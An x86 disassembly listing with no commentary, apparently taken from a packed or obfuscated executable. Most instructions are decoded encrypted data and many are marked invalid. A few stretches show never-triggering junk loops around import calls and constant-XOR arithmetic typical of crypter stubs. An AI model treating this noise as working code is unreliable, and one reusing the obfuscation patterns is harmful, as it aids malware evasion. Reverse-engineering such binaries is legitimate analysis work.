  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	or     eax,0x7f8ef287
  4176bf:	sub    eax,0x7e05787f
  4176c4:	js     0x41773e
  4176c6:	(bad)  
  4176c8:	out    0xd8,eax
  4176ca:	fcom   QWORD PTR [ecx-0x4b68e3e]
  4176d0:	popf   
  4176d1:	fstp   st(6)
  4176d3:	inc    ebx
  4176d4:	xlat   BYTE PTR ds:[ebx]
  4176d5:	lahf   
  4176d6:	sti    
  4176d7:	outs   dx,DWORD PTR ds:[esi]
  4176d8:	cli    
  4176d9:	and    al,0xd4
  4176db:	pushf  
  4176dc:	and    BYTE PTR [edx],0x89
  4176df:	sub    BYTE PTR [eax+0x505be9a6],0xcc
  4176e6:	popa   
  4176e7:	adc    BYTE PTR [ecx+0x64190cf4],0xb0
  4176ee:	jl     0x417680
  4176f0:	lods   eax,DWORD PTR ds:[esi]
  4176f1:	sub    DWORD PTR [esi-0x79],edi
  4176f4:	mov    ebp,0x56b8c26e
  4176f9:	xchg   ebp,eax
  4176fa:	or     edi,DWORD PTR [ebp+eiz*4+0x5b]
  4176fe:	xchg   ecx,eax
  4176ff:	bound  ebx,QWORD PTR ss:0x246b4739
  417706:	sbb    eax,0x5f2a57ec
  41770b:	dec    eax
  41770c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770d:	pop    ss
  41770e:	sar    BYTE PTR [edx+0x25],0x19
  417712:	ds pusha 
  417714:	js     0x4176fb
  417716:	dec    eax
  417717:	popf   
  417718:	outs   dx,DWORD PTR gs:[esi]
  41771a:	bound  ebx,QWORD PTR [edi+0x7]
  41771d:	sar    BYTE PTR ds:[ebx+0x171c915d],0x3a
  417725:	(bad)  
  417726:	xchg   ecx,eax
  417727:	xchg   esi,ecx
  417729:	jmp    0x1543:0x6653d36a
  417730:	mov    ds:0xb55fdf14,eax
  417735:	mov    ah,0xe7
  417737:	sbb    al,0xc
  417739:	in     al,0xbf
  41773b:	xor    edi,DWORD PTR [ebx+0x37]
  41773e:	or     eax,0xd756e6ff
  417743:	jp     0x4177ae
  417745:	sbb    BYTE PTR [edx-0x1383af2],bl
  41774b:	(bad)  
  41774c:	fwait
  41774d:	pop    ebp
  41774e:	enter  0x400,0x93
  417752:	(bad)  
  417754:	cli    
  417755:	mov    al,0xa9
  417757:	stos   DWORD PTR es:[edi],eax
  417758:	cmp    BYTE PTR [ebx-0x1f],bh
  41775b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41775c:	outs   dx,DWORD PTR ds:[esi]
  41775d:	push   es
  41775e:	push   ebp
  41775f:	fwait
  417760:	pusha  
  417761:	or     DWORD PTR [ebp+0xa],ebx
  417764:	push   esp
  417765:	or     DWORD PTR [ecx],edx
  417767:	add    BYTE PTR [esi+0x11],cl
  41776a:	mov    bh,0x72
  41776c:	(bad)  
  41776e:	push   ds
  41776f:	std    
  417770:	sahf   
  417771:	mov    al,ds:0x4fa1a85d
  417776:	or     edi,edx
  417778:	or     al,0x9f
  41777a:	push   ebx
  41777b:	jp     0x4177e3
  41777d:	push   0xfd12ee0c
  417782:	push   es
  417783:	imul   BYTE PTR [edx]
  417785:	jecxz  0x417730
  417787:	jmp    0x7b2a6407
  41778c:	rcl    DWORD PTR ds:0xd2431554,cl
  417792:	outs   dx,DWORD PTR ds:[esi]
  417793:	pop    ecx
  417794:	lods   al,BYTE PTR ds:[esi]
  417795:	pop    ss
  417796:	jmp    ebp
  417798:	adc    bh,BYTE PTR [edi+edi*8]
  41779b:	out    0xf8,eax
  41779d:	aad    0xb9
  41779f:	xchg   BYTE PTR [edi+0x35f6a73f],cl
  4177a5:	hlt    
  4177a6:	inc    esp
  4177a7:	dec    ecx
  4177a8:	sbb    DWORD PTR ds:0x6d364730,ecx
  4177ae:	mov    bx,0x5189
  4177b2:	mov    ?,WORD PTR ds:0xa68d2901
  4177b8:	test   al,0xff
  4177ba:	dec    ecx
  4177bb:	mov    al,ds:0x1c7d85f9
  4177c0:	in     al,0xa6
  4177c2:	rcr    BYTE PTR [ecx],1
  4177c4:	mov    ah,0x37
  4177c6:	pushf  
  4177c7:	mov    eax,ds:0x168a007b
  4177cc:	sub    esi,esi
  4177ce:	mov    dl,0xe2
  4177d0:	dec    ebp
  4177d1:	cwde   
  4177d2:	or     DWORD PTR [edi-0x39],ebp
  4177d5:	pusha  
  4177d6:	cmp    esi,DWORD PTR [edx-0x72e76e0b]
  4177dc:	ret    0x3911
  4177df:	repz or BYTE PTR [ecx+0x20],bl
  4177e3:	out    dx,al
  4177e4:	sbb    al,0xe2
  4177e6:	jb     0x41777f
  4177e8:	jl     0x4177cb
  4177ea:	dec    esi
  4177eb:	mov    edx,0x2859ba5d
  4177f0:	add    ecx,ebx
  4177f2:	adc    eax,edi
  4177f4:	stos   BYTE PTR es:[edi],al
  4177f5:	jnp    0x4177e1
  4177f7:	push   ebx
  4177f8:	xchg   DWORD PTR [ebx-0xbd85472],edi
  4177fe:	popf   
  4177ff:	jns    0x41779b
  417801:	jo     0x41785d
  417803:	and    DWORD PTR [edx-0x5a],ebp
  417806:	and    DWORD PTR [esi],esp
  417808:	sti    
  417809:	data16 cld 
  41780b:	lods   eax,DWORD PTR ds:[esi]
  41780c:	fwait
  41780d:	sbb    eax,0xeead4be7
  417812:	push   cs
  417813:	add    BYTE PTR [eax+0x3832d8f0],dh
  417819:	xchg   edi,eax
  41781a:	mov    dl,0xee
  41781c:	or     eax,0x93fa42fb
  417821:	sbb    bl,BYTE PTR [ebx-0x44dcacc2]
  417827:	add    al,0x7a
  417829:	sub    cl,0x90
  41782c:	mov    ch,0xbd
  41782e:	mov    eax,0xb3fa592e
  417833:	push   cs
  417834:	xlat   BYTE PTR ds:[ebx]
  417835:	xchg   ebp,eax
  417836:	and    DWORD PTR [edx+ebp*1],esi
  417839:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41783b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41783c:	xchg   ebp,eax
  41783d:	inc    edx
  41783e:	or     BYTE PTR [eax-0x1b],dl
  417841:	jno    0x417887
  417843:	add    eax,0xcfaa414a
  417848:	mov    WORD PTR [ecx+0x678154c7],es
  41784e:	pop    ecx
  41784f:	sbb    ah,BYTE PTR [edx+0x7076f966]
  417855:	dec    eax
  417856:	cmp    eax,0x7ab589c3
  41785b:	hlt    
  41785c:	xor    bh,ch
  41785e:	xchg   ebx,eax
  41785f:	xor    al,dh
  417861:	les    edi,FWORD PTR [edi]
  417863:	icebp  
  417864:	addr16 cld 
  417866:	sub    BYTE PTR [ecx-0x30],0xf
  41786a:	test   eax,0x2a2cdae1
  41786f:	sub    al,0x9
  417871:	dec    eax
  417872:	sub    edx,DWORD PTR [ebx-0x6]
  417875:	in     al,dx
  417876:	xor    BYTE PTR [edi],al
  417878:	scas   eax,DWORD PTR es:[edi]
  417879:	xor    eax,0x44525a9d
  41787e:	stos   DWORD PTR es:[edi],eax
  41787f:	ins    DWORD PTR es:[edi],dx
  417880:	outs   dx,BYTE PTR ds:[esi]
  417881:	xor    BYTE PTR [eax-0x5b],bh
  417884:	inc    eax
  417885:	(bad)  
  417886:	ja     0x417828
  417888:	int    0x4d
  41788a:	jmp    0x15f0:0x25fe8dea
  417891:	xor    ebx,edi
  417893:	push   es
  417894:	adc    DWORD PTR [ebx+0x60],ecx
  417897:	adc    eax,0xd1635c84
  41789c:	scas   al,BYTE PTR es:[edi]
  41789d:	mov    ch,ch
  41789f:	call   0xc813:0x4ec7
  4178a5:	jne    0x417837
  4178a7:	(bad)  [edi-0x6b]
  4178aa:	jge    0x4178e3
  4178ac:	test   BYTE PTR [edi-0x2cdd3573],cl
  4178b2:	shr    DWORD PTR ds:0xe93ddbcb,0xea
  4178b9:	and    eax,0xd85152b1
  4178be:	inc    edi
  4178bf:	(bad)  
  4178c0:	loop   0x4178f5
  4178c2:	inc    ecx
  4178c3:	mov    DWORD PTR [edx+0x6d],esi
  4178c6:	mov    esi,0x5916a6e8
  4178cb:	pop    esi
  4178cc:	xchg   edi,eax
  4178cd:	je     0x4178bb
  4178cf:	sti    
  4178d0:	lds    eax,FWORD PTR [ebx]
  4178d2:	dec    eax
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	and    ch,BYTE PTR [ebp+0x330429d7]
  4178eb:	jg     0x417965
  4178ed:	add    eax,0x8e78787e
  4178f2:	lods   al,BYTE PTR ds:[esi]
  4178f3:	cs (bad) 
  4178f5:	popf   
  4178f6:	push   ds
  4178f7:	push   edi
  4178f8:	les    edx,FWORD PTR [edx-0x1f689eed]
  4178fe:	sub    eax,0xc9a9a8a5
  417903:	jge    0x417937
  417905:	scas   al,BYTE PTR es:[edi]
  417906:	std    
  417907:	xor    al,0x46
  417909:	adc    BYTE PTR [edx],0xd0
  41790c:	cdq    
  41790d:	mov    bh,0x52
  41790f:	out    0x2b,eax
  417911:	push   0xf10cf485
  417916:	gs mov al,0xfe
  417919:	jae    0x4178a8
  41791b:	(bad)  
  41791c:	inc    esp
  41791d:	int    0xa1
  41791f:	jnp    0x4178bd
  417921:	mov    ds:0x16e85ba,eax
  417926:	outs   dx,BYTE PTR ds:[esi]
  417927:	jmp    0x417988
  417929:	jle    0x4179a4
  41792b:	mov    eax,ds:0x552316d1
  417930:	les    eax,FWORD PTR [edi+0x57dfba30]
  417936:	mov    ah,dh
  417938:	sbb    al,al
  41793a:	dec    esi
  41793b:	cmc    
  41793c:	pop    ecx
  41793d:	jg     0x4178fc
  41793f:	xor    cl,BYTE PTR [ecx-0x17]
  417942:	cdq    
  417943:	dec    esi
  417944:	and    eax,0xeec1bafe
  417949:	xor    ecx,0x5a
  41794c:	inc    ebx
  41794d:	fdivr  QWORD PTR [ecx]
  41794f:	fst    DWORD PTR [ecx-0xa]
  417952:	mov    dh,0xde
  417954:	es sub DWORD PTR cs:[eax+0x51d8765c],edi
  41795c:	test   DWORD PTR [ecx+0xc9be45b],edi
  417962:	fwait
  417963:	in     eax,0x77
  417965:	dec    ebx
  417966:	jg     0x41790d
  417968:	jg     0x417907
  41796a:	mov    esp,DWORD PTR [ebx+0x4f]
  41796d:	aad    0xdd
  41796f:	jbe    0x4179ac
  417971:	ds push 0xffffff9b
  417974:	mov    esi,0x2ec6bef0
  417979:	(bad)  
  41797a:	shl    BYTE PTR [edx+0x13],0xbb
  41797e:	push   ebx
  41797f:	xchg   esp,eax
  417980:	hlt    
  417981:	outs   dx,BYTE PTR ds:[esi]
  417982:	or     al,0xf7
  417984:	mov    dl,0x72
  417986:	loopne 0x41798a
  417988:	in     al,dx
  417989:	dec    esp
  41798a:	or     ebp,DWORD PTR [eax-0x1c]
  41798d:	xor    ecx,0x4a
  417990:	push   ds
  417991:	and    DWORD PTR [ebp-0x21d447b3],ebx
  417997:	push   ds
  417998:	fdivr  DWORD PTR [ecx-0x6a]
  41799b:	or     edi,esp
  41799d:	mov    eax,DWORD PTR [edi-0x29]
  4179a0:	mov    al,0xa0
  4179a2:	movntps XMMWORD PTR [ecx],xmm6
  4179a5:	test   al,0x1d
  4179a7:	jmp    0x417992
  4179a9:	jnp    0x417962
  4179ab:	sbb    eax,0xb993ff09
  4179b0:	cld    
  4179b1:	add    ah,BYTE PTR [ebp-0x3148257e]
  4179b7:	jg     0x4179b7
  4179b9:	int3   
  4179ba:	out    0x9e,al
  4179bc:	sbb    eax,0x76baafb4
  4179c1:	add    eax,0xe59b78e0
  4179c6:	and    eax,0x834a74bf
  4179cb:	cwde   
  4179cc:	(bad)  
  4179ce:	iret   
  4179cf:	fidivr WORD PTR [ebp-0x6ed05928]
  4179d5:	les    eax,FWORD PTR [eax+0x4d]
  4179d8:	xchg   ebp,eax
  4179d9:	pop    esp
  4179da:	retf   
  4179db:	stos   DWORD PTR es:[edi],eax
  4179dc:	xchg   esi,eax
  4179dd:	sbb    al,0x51
  4179df:	cld    
  4179e0:	call   0x630df8c2
  4179e5:	lea    esp,[edx+0x1c]
  4179e8:	xor    esi,DWORD PTR [edx-0x3]
  4179eb:	or     BYTE PTR [ebx-0x43],bh
  4179ee:	inc    esi
  4179ef:	jbe    0x4179d7
  4179f1:	xchg   DWORD PTR [ecx],edx
  4179f3:	scas   al,BYTE PTR es:[di]
  4179f5:	js     0x417993
  4179f7:	cmp    bh,BYTE PTR [eax]
  4179f9:	xchg   BYTE PTR [ecx],bh
  4179fb:	jb     0x4179c1
  4179fd:	imul   ebx,DWORD PTR [ecx-0x30b53da1],0xffffff86
  417a04:	std    
  417a05:	out    0x19,eax
  417a07:	mov    cl,0xb
  417a09:	jns    0x417a35
  417a0b:	push   ecx
  417a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0d:	dec    ebx
  417a0e:	add    eax,0x93e4d399
  417a13:	outs   dx,BYTE PTR ds:[esi]
  417a14:	fdiv   QWORD PTR [esi]
  417a16:	sbb    dl,BYTE PTR [esi]
  417a18:	xor    DWORD PTR [edx-0x11],ebx
  417a1b:	iret   
  417a1c:	(bad)  
  417a1e:	pushf  
  417a1f:	(bad)  
  417a20:	in     al,dx
  417a21:	aas    
  417a22:	jl     0x417a64
  417a24:	mov    esi,0x50a2fc8a
  417a29:	and    dh,BYTE PTR cs:[ecx]
  417a2c:	pop    eax
  417a2d:	stos   BYTE PTR es:[edi],al
  417a2e:	xchg   edx,eax
  417a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a30:	les    ebx,FWORD PTR [edx]
  417a32:	mov    bl,0x95
  417a34:	push   ebp
  417a35:	mov    ebp,0xd4e9952b
  417a3a:	jne    0x417a08
  417a3c:	xchg   edx,eax
  417a3d:	sub    al,0x8b
  417a3f:	push   ds
  417a40:	and    DWORD PTR ss:[eax+0xc],ebx
  417a44:	js     0x417a59
  417a46:	pop    ebp
  417a47:	mov    eax,0xee9f4efb
  417a4c:	les    esp,FWORD PTR [ebx-0x20]
  417a4f:	fmul   QWORD PTR [eax-0xc30a040]
  417a55:	iret   
  417a56:	gs shl edi,0x1c
  417a5a:	(bad)
  417a5d:	je     0x417a8c
  417a5f:	cmp    eax,DWORD PTR [edi-0x3778cbd9]
  417a65:	sti    
  417a66:	hlt    
  417a67:	in     al,dx
  417a68:	js     0x417a4d
  417a6a:	push   ecx
  417a6b:	aam    0x12
  417a6d:	pop    es
  417a6e:	sbb    cl,BYTE PTR [ebp+0xe]
  417a71:	mov    ch,0xe0
  417a73:	retf   0x5341
  417a76:	fdivr  QWORD PTR [esp+edx*1-0x59d0c07a]
  417a7d:	mov    ah,0x0
  417a7f:	div    DWORD PTR [edi]
  417a81:	and    eax,0xb72b13a8
  417a86:	int    0xa9
  417a88:	sbb    al,0xec
  417a8a:	hlt    
  417a8b:	retf   0x1848
  417a8e:	or     BYTE PTR [eax+edi*1-0xdcce3db],al
  417a95:	imul   esi,DWORD PTR [eax-0x64],0x36
  417a99:	xlat   BYTE PTR ds:[ebx]
  417a9a:	xchg   esp,eax
  417a9b:	add    ebx,DWORD PTR ds:0x9334ac15
  417aa1:	cwde   
  417aa2:	test   DWORD PTR [eax-0x123c8ab6],eax
  417aa8:	bound  edi,QWORD PTR [edi-0x66b578a8]
  417aae:	fld    QWORD PTR es:[edx+0x25]
  417ab2:	sti    
  417ab3:	pop    ecx
  417ab4:	adc    dh,BYTE PTR [edi-0x25645b8a]
  417aba:	adc    edx,0xffffffaa
  417abd:	jmp    0x7752:0xa6ace559
  417ac4:	ror    al,0xcd
  417ac7:	push   ebp
  417ac8:	push   DWORD PTR [ebx-0x26]
  417acb:	sbb    eax,0x556b31ba
  417ad0:	adc    bl,dl
  417ad2:	rcl    BYTE PTR [ebx],1
  417ad4:	mov    ds:0xd3e36add,al
  417ad9:	aaa    
  417ada:	fld    TBYTE PTR [esi]
  417adc:	les    ebp,FWORD PTR [edx+0x4d]
  417adf:	int    0x83
  417ae1:	stc    
  417ae2:	or     ebp,ecx
  417ae4:	dec    ebx
  417ae5:	adc    bh,cl
  417ae7:	icebp  
  417ae8:	add    BYTE PTR [ecx-0xc],al
  417aeb:	or     bh,BYTE PTR ds:0x68414b36
  417af1:	mov    dl,0x34
  417af3:	jmp    0xc9d3c7c4
  417af8:	or     bl,BYTE PTR [eax+0x50ba7280]
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xcc3b2f6c
  417b49:	and    eax,0x787f3111
  417b4e:	add    eax,0xd078787e
  417b53:	retf   0x8d43
  417b56:	mov    ebx,0x6c574e30
  417b5b:	data16 loop 0x417b6a
  417b5e:	push   ecx
  417b5f:	push   ebp
  417b60:	mov    ch,0xd
  417b62:	and    DWORD PTR [edi],ebx
  417b64:	xor    ebx,DWORD PTR [ebx-0x43a461ab]
  417b6a:	mov    edx,esi
  417b6c:	sub    bh,0x96
  417b6f:	ret    0xf2ff
  417b72:	ret    0x14f2
  417b75:	push   edx
  417b76:	cmp    DWORD PTR [eax+0x1b619b27],0xffffffa5
  417b7d:	or     bl,BYTE PTR [esp+eiz*2+0x57cdff33]
  417b84:	xor    eax,0xbc16e660
  417b89:	sbb    ebp,edi
  417b8b:	daa    
  417b8c:	push   ebp
  417b8d:	fdiv   st(0),st
  417b8f:	pop    ebp
  417b90:	mov    ch,0x67
  417b92:	ror    BYTE PTR [edi+0x12],1
  417b95:	xchg   ebx,eax
  417b96:	pop    ds
  417b97:	fwait
  417b98:	cs stc 
  417b9a:	nop
  417b9b:	in     eax,dx
  417b9c:	sub    cl,0x8b
  417b9f:	jne    0x417bc5
  417ba1:	retf   0xb969
  417ba4:	sub    BYTE PTR [edx],0x33
  417ba7:	push   edx
  417ba8:	frstor [edi+0x3b]
  417bab:	scas   al,BYTE PTR es:[edi]
  417bac:	inc    esi
  417bad:	adc    edx,DWORD PTR [edx-0x66]
  417bb0:	jle    0x417c07
  417bb2:	or     ebx,DWORD PTR [ecx-0x4df66f19]
  417bb8:	sub    DWORD PTR [ecx+0x3489ac7c],ebp
  417bbe:	(bad)  
  417bc0:	loop   0x417c1f
  417bc2:	ror    dl,1
  417bc4:	ins    DWORD PTR es:[edi],dx
  417bc5:	inc    ecx
  417bc6:	pop    ebx
  417bc7:	pop    ecx
  417bc8:	ss add al,0xb4
  417bcb:	cmp    DWORD PTR [ebp-0x38],ecx
  417bce:	and    eax,0xf4fdcdd7
  417bd3:	mov    cl,0x31
  417bd5:	mov    ds:0xef38d8bd,eax
  417bda:	test   BYTE PTR [eax-0x7d],al
  417bdd:	dec    eax
  417bde:	(bad)
  417be3:	lea    ebp,[ecx+eiz*8-0x32]
  417be7:	jg     0x417ba2
  417be9:	inc    esp
  417bea:	inc    ecx
  417beb:	rol    eax,cl
  417bed:	pop    esp
  417bee:	inc    esp
  417bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bf0:	mov    cl,0x17
  417bf2:	lock xor esp,edi
  417bf5:	enter  0x53be,0x79
  417bf9:	cmp    ch,ah
  417bfb:	mov    ds:0xd1de793e,al
  417c00:	test   al,0xac
  417c02:	hlt    
  417c03:	fnstenv [ebx+0x1]
  417c06:	pop    ecx
  417c07:	cld    
  417c08:	sub    eax,0xb3c1548d
  417c0d:	ret    
  417c0e:	sbb    ecx,ebp
  417c10:	xchg   ebp,eax
  417c11:	add    al,bl
  417c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c14:	enter  0x6f3c,0x3f
  417c18:	or     esi,DWORD PTR [ebx]
  417c1a:	mov    edi,0x5412eed
  417c1f:	dec    edx
  417c20:	mov    WORD PTR [esi+0x46524a1],ss
  417c26:	jae    0x417c9e
  417c28:	out    0x86,eax
  417c2a:	or     DWORD PTR [edi-0xf733a0c],edx
  417c30:	sub    BYTE PTR [eax-0x45],cl
  417c33:	push   ebx
  417c34:	mov    BYTE PTR [esi-0x7d],al
  417c37:	mov    esi,0x7424104d
  417c3c:	mov    esi,0x5126f38a
  417c41:	push   0x2b
  417c43:	retf   0x9e8b
  417c46:	retf   0xfadb
  417c49:	lock scas eax,DWORD PTR es:[edi]
  417c4b:	ds adc dl,ch
  417c4e:	lea    ecx,[esi+ebx*8-0x2c]
  417c52:	xor    BYTE PTR [eax],dh
  417c54:	(bad)  
  417c55:	out    0x83,eax
  417c57:	ficomp WORD PTR [ecx-0x3d]
  417c5a:	inc    edx
  417c5b:	xor    al,0xd3
  417c5e:	xor    eax,0x360e262
  417c63:	sub    edx,eax
  417c65:	jl     0x417cdd
  417c67:	pop    ecx
  417c68:	rcl    ah,cl
  417c6a:	xchg   esp,eax
  417c6b:	ret    
  417c6c:	xchg   ebx,eax
  417c6d:	sti    
  417c6e:	outs   dx,DWORD PTR ds:[esi]
  417c6f:	mov    ds:0xf5cf04fa,al
  417c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c75:	add    al,BYTE PTR [ebp+0x7]
  417c78:	push   es
  417c79:	jae    0x417cdf
  417c7b:	(bad)  
  417c7c:	jge    0x417c69
  417c7e:	xor    DWORD PTR [ebp-0x5184d2fc],eax
  417c84:	xor    BYTE PTR [eax-0x8],0xfc
  417c88:	outs   dx,BYTE PTR ds:[esi]
  417c89:	jbe    0x417c98
  417c8b:	bound  eax,QWORD PTR [edi+eax*8+0x2220a5b8]
  417c92:	xlat   BYTE PTR ds:[ebx]
  417c93:	test   cl,cl
  417c95:	mov    bl,BYTE PTR [esi+0x2be1c55]
  417c9b:	mov    DWORD PTR [eax],edi
  417c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c9e:	sub    DWORD PTR [edi],edx
  417ca0:	iret   
  417ca1:	inc    ecx
  417ca2:	mov    eax,ds:0xcf8dc533
  417ca7:	ins    BYTE PTR es:[edi],dx
  417ca8:	push   esp
  417ca9:	push   cs
  417caa:	stos   BYTE PTR es:[edi],al
  417cab:	aaa    
  417cac:	jnp    0x417d1b
  417cae:	sub    edx,ecx
  417cb0:	loopne 0x417c88
  417cb2:	mov    edx,DWORD PTR [edx]
  417cb4:	fistp  QWORD PTR [edi-0x34]
  417cb7:	ret    
  417cb8:	mov    ds:0xc51bf465,eax
  417cbd:	or     al,0x12
  417cbf:	fidiv  WORD PTR [ebp-0x1a]
  417cc2:	les    ebx,FWORD PTR ds:0x21130b83
  417cc8:	pop    ebp
  417cc9:	xchg   edi,eax
  417cca:	xor    DWORD PTR [esi-0x65b182b7],edi
  417cd0:	mov    eax,ds:0x45cad6e8
  417cd5:	and    DWORD PTR ds:0x3ec55e8a,ebp
  417cdb:	jecxz  0x417cde
  417cdd:	pop    ecx
  417cde:	sub    BYTE PTR [edi-0x7f],al
  417ce1:	into   
  417ce2:	data16 jbe 0x417d0c
  417ce5:	cld    
  417ce6:	(bad)  
  417ce7:	adc    BYTE PTR [ebp+0x56],dl
  417cea:	and    bh,BYTE PTR [esi+0x43f2ced1]
  417cf0:	jmp    0xb24a:0xf46aada7
  417cf7:	pushf  
  417cf8:	call   0xba2aaf70
  417cfd:	sub    ah,bh
  417cff:	sub    edx,ebp
  417d01:	cmp    BYTE PTR [ecx-0x40],dh
  417d04:	push   ss
  417d05:	(bad)  
  417d07:	sbb    BYTE PTR [edi-0x18],al
  417d0a:	inc    eax
  417d0b:	fbstp  TBYTE PTR [ebx]
  417d0d:	push   ecx
  417d0e:	icebp  
  417d0f:	add    al,0xa2
  417d11:	or     edi,DWORD PTR [eax+eax*2]
  417d14:	inc    esp
  417d15:	pushf  
  417d16:	aas    
  417d17:	xchg   ah,ah
  417d19:	pop    edx
  417d1a:	(bad)  
  417d1b:	cld    
  417d1c:	cwde   
  417d1d:	addr16 addr16 aas 
  417d20:	and    bh,cl
  417d22:	inc    ecx
  417d23:	out    0xf,al
  417d25:	cmp    BYTE PTR [esi],0x3f
  417d28:	sar    DWORD PTR [edx],cl
  417d2a:	ja     0x417d29
  417d2c:	cmc    
  417d2d:	repnz add al,0x2b
  417d30:	push   ss
  417d31:	sti    
  417d32:	adc    dh,BYTE PTR [edi+esi*4]
  417d35:	xor    esp,esi
  417d37:	arpl   WORD PTR [edi+0xa7767bd],si
  417d3d:	hlt    
  417d3e:	enter  0xac27,0xd2
  417d42:	dec    eax
  417d43:	imul   ebx,esp,0x69
  417d46:	sub    al,0x74
  417d48:	or     edx,DWORD PTR [eax-0x1a5b8f0]
  417d4e:	adc    edx,DWORD PTR [edx-0x1b]
  417d51:	retf   
  417d52:	sub    DWORD PTR [esi+0x3b],esp
  417d55:	jae    0x417dc7
  417d57:	in     al,0xa9
  417d59:	ss jecxz 0x417d88
  417d5c:	xor    dh,BYTE PTR ds:0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a821,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a821
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a821,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a821,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a821,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a825
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a79d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a85d,0x42a851
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a855,0x42a8a9
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a795,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a855,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a82d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a779,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a811,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a811
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a811,esi
  417e51:	cmp    DWORD PTR ds:0x42a811,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a811,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	inc    DWORD PTR [edx]
  417e8e:	stos   DWORD PTR es:[edi],eax
  417e8f:	add    bl,cl
  417e91:	push   ds
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	cdq    
  417e9a:	cwde   
  417e9b:	mov    ch,0x4
  417e9d:	push   ds
  417e9e:	les    edi,FWORD PTR [esi+0x31]
  417ea1:	xor    al,0x2b
  417ea3:	push   ecx
  417ea4:	mov    WORD PTR [ebx+0x1b],ds
  417ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ea8:	xchg   ecx,eax
  417ea9:	sbb    al,0x64
  417eab:	ror    DWORD PTR [edi+eiz*4+0x57],1
  417eaf:	and    eax,0x87304bac
  417eb4:	mov    dh,0x7f
  417eb6:	mov    ecx,0xb6754301
  417ebb:	pop    ss
  417ebc:	cmp    BYTE PTR [ecx+edx*1],cl
  417ebf:	sub    DWORD PTR [esi],ecx
  417ec1:	(bad)  
  417ec2:	fs sub al,0xf7
